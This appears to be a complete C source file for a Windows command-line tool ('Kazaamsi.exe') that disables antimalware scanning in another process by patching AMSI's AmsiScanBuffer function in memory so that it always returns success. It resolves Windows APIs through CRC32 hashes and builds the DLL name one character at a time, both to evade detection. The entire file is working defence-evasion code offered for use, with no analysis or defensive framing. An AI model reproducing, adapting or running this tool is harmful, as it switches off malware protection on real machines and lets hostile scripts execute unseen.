#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "structs.h"
#include "hashutils.h"

#define PATCH_BYTES "\x31\xC0\xC3"
#define PATCH_LEN 3
#define PAGE_SIZE 0x1000

BOOL g_Verbose = FALSE;

typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI* fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* fnModule32FirstW)(HANDLE, LPMODULEENTRY32W);
typedef BOOL(WINAPI* fnModule32NextW)(HANDLE, LPMODULEENTRY32W);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);

typedef struct _WIN32_API {
    fnLoadLibraryA              pLoadLibraryA;
    fnVirtualProtectEx          pVirtualProtectEx;
    fnWriteProcessMemory        pWriteProcessMemory;
    fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
    fnModule32FirstW            pModule32FirstW;
    fnModule32NextW             pModule32NextW;
    fnCloseHandle               pCloseHandle;
    fnOpenProcess               pOpenProcess;
} WIN32_API, * PWIN32_API;

void ToUpperA(char* out, const char* in, size_t len) {
    for (size_t i = 0; i < len; i++) {
        out[i] = (in[i] >= 'a' && in[i] <= 'z') ? (in[i] - 'a' + 'A') : in[i];
    }
}

BOOL InitializeWin32Api(PWIN32_API pWin32api) {
    HMODULE hKernel32 = NULL; 

    if (!(hKernel32 = GetModuleHandleH(KERNEL32_CRC32))) {
        printf("[!] Failed to locate kernel32.dll.\n");
        return FALSE;
    }
    if (g_Verbose)
        printf("[>] kernel32.dll base address: 0x%p\n", hKernel32);

    pWin32api->pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CRC32);
    pWin32api->pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_CRC32);
    pWin32api->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_CRC32);
    pWin32api->pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
    pWin32api->pModule32FirstW = (fnModule32FirstW)GetProcAddressH(hKernel32, Module32FirstW_CRC32);
    pWin32api->pModule32NextW = (fnModule32NextW)GetProcAddressH(hKernel32, Module32NextW_CRC32);
    pWin32api->pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32);
    pWin32api->pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_CRC32);

    if (!pWin32api->pLoadLibraryA || !pWin32api->pVirtualProtectEx || !pWin32api->pWriteProcessMemory ||
        !pWin32api->pCreateToolhelp32Snapshot || !pWin32api->pModule32FirstW ||
        !pWin32api->pModule32NextW || !pWin32api->pCloseHandle || !pWin32api->pOpenProcess) {
        printf("[!] Failed to resolve one or more kernel32 functions.\n");
        return FALSE;
    }

    return TRUE;
}

PVOID GetRemoteModBase(DWORD dwPid, DWORD dwModHash, WIN32_API win32api) {
    MODULEENTRY32 modEntry;
    HANDLE hSnapshot;
    char modNameA[MAX_PATH] = { 0 };
    char upperModNameA[MAX_PATH] = { 0 };
    SIZE_T nameLen = 0;

    modEntry.dwSize = sizeof(modEntry);
    hSnapshot = win32api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
        return NULL;
    }

    if (win32api.pModule32FirstW(hSnapshot, &modEntry)) {
        do {
            memset(modNameA, 0, MAX_PATH);
            memset(upperModNameA, 0, MAX_PATH);

            WideCharToMultiByte(CP_ACP, 0, modEntry.szModule, -1, modNameA, MAX_PATH, NULL, NULL);
            nameLen = strlen(modNameA);
            ToUpperA(upperModNameA, modNameA, nameLen);

            if (CRC32BA(upperModNameA) == dwModHash) {
                if (g_Verbose)
                    printf("[>] %s base address: 0x%p\n", modNameA, modEntry.modBaseAddr);
                win32api.pCloseHandle(hSnapshot);
                return modEntry.modBaseAddr;
            }
        } while (win32api.pModule32NextW(hSnapshot, &modEntry));
    }
    else {
        printf("[!] Module32FirstW failed. Error: %d\n", GetLastError());
    }

    win32api.pCloseHandle(hSnapshot);
    return NULL;
}

BOOL GetRemoteAddress(IN DWORD dwPid, IN WIN32_API win32api, PVOID* ppBuffer) {
    char dllNameA[] = { 'a','m','s','i','.','d','l','l', 0 };
    HMODULE hModBase = NULL;
    PBYTE pFuncAddr = NULL;
    SIZE_T offset = 0;
    PBYTE pRemoteModBase = NULL;
    PVOID pRemoteFuncAddr = NULL;

   if (!(hModBase = win32api.pLoadLibraryA(dllNameA))) {
        printf("[!] LoadLibraryA failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    if (!(pFuncAddr = (PBYTE)GetProcAddressH(hModBase, AmsiScanBuffer_CRC32))) {
        printf("[!] GetProcAddress failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    offset = (SIZE_T)(pFuncAddr - (PBYTE)hModBase);

    if (!(pRemoteModBase = (PBYTE)GetRemoteModBase(dwPid, AMSI_CRC32, win32api))) {
        printf("[!] Failed to locate remote AMSI module.\n");
        return FALSE;
    }

    pRemoteFuncAddr = pRemoteModBase + offset;
    if (g_Verbose)
        printf("[>] Located target address: 0x%p\n", pRemoteFuncAddr);

    *ppBuffer = pRemoteFuncAddr;
    return TRUE;
}

BOOL GetProcessHandle(IN DWORD dwPid, IN WIN32_API win32api, OUT PHANDLE phProcess) {
    DWORD dwAccess = PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
    HANDLE hProcess = NULL;
    
    if (g_Verbose)
        printf("[>] Opening process handle to PID %lu.\n", dwPid);

    if (!(hProcess = win32api.pOpenProcess(dwAccess, FALSE, dwPid))) {
        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    *phProcess = hProcess;
    return TRUE;
}

BOOL PatchRemoteProcess(IN HANDLE hProcess, IN PVOID pAddress, IN WIN32_API win32api) {
    char patchBytes[] = PATCH_BYTES;
    PVOID pageBase = (PVOID)((ULONG_PTR)pAddress & ~(PAGE_SIZE - 1));
    DWORD oldProtect = 0;

    if (!win32api.pVirtualProtectEx(hProcess, pageBase, PAGE_SIZE, PAGE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtectEx failed: %u\n", GetLastError());
        return FALSE;
    }

    if (!win32api.pWriteProcessMemory(hProcess, pAddress, patchBytes, PATCH_LEN, NULL)) {
        printf("[!] WriteProcessMemory failed: %u\n", GetLastError());
        return FALSE;
    }

    if (!win32api.pVirtualProtectEx(hProcess, pageBase, PAGE_SIZE, oldProtect, &oldProtect)) {
        printf("[!] Failed to restore memory protection. Error: %u\n", GetLastError());
        return FALSE;
    }

    printf("[>] Process successfully patched.\n");
    return TRUE;
}

BOOL ParseArguments(int argc, char** argv, OUT DWORD* pdwPid, OUT BOOL* pVerbose) {
    if (argc < 2 || argc > 3)  {
        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
        return FALSE;
    }

    if ((*pdwPid = strtoul(argv[1], NULL, 10)) == 0) {
        printf("[!] Invalid PID: %s\n", argv[1]);
        return FALSE;
    }

    *pVerbose = (argc == 3 && strcmp(argv[2], "-v") == 0);
    return TRUE;
}

int main(int argc, char** argv) {
    WIN32_API api = { 0 };
    DWORD dwRemotePid = 0;
    PVOID pRemoteAddr = NULL;
    HANDLE hRemoteProc = NULL;

    if (!ParseArguments(argc, argv, &dwRemotePid, &g_Verbose))
        return -1;

    if (!InitializeWin32Api(&api)) {
        printf("[!] Could not resolve required APIs.\n");
        return -1;
    }

    if (!GetRemoteAddress(dwRemotePid, api, &pRemoteAddr)) {
        printf("[!] Failed to resolve target function address.\n");
        return -1;
    }

    if (!GetProcessHandle(dwRemotePid, api, &hRemoteProc)) {
        printf("[!] Failed to obtain process handle.\n");
        return -1;
    }

    if (!PatchRemoteProcess(hRemoteProc, pRemoteAddr, api)) {
        api.pCloseHandle(hRemoteProc);
        return -1;
    }

    if (g_Verbose)
        printf("[>] Cleaning up\n");

    api.pCloseHandle(hRemoteProc);
    return 0;
}
